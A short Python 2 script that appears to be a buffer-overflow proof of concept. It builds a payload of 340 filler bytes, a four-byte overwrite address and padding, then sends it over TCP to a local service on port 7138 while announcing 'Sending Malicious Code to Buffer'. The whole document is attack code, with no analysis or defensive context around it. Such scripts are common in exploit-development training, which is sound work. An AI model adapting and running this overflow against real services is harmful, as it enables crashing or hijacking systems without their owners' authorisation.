#!/usr/bin/python
import socket

# 41 10 15 03
buffer = 'A' * 340 + "\x03\x15\x10\x41" + 'C' * (1000-340-4) 

try:
    print "\n Sending Malicious Code to Buffer..."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 7138))
    s.send(buffer)
    s.close()
    print "\nBuffer Overflowed"
except:
    print "Could not connect to application"
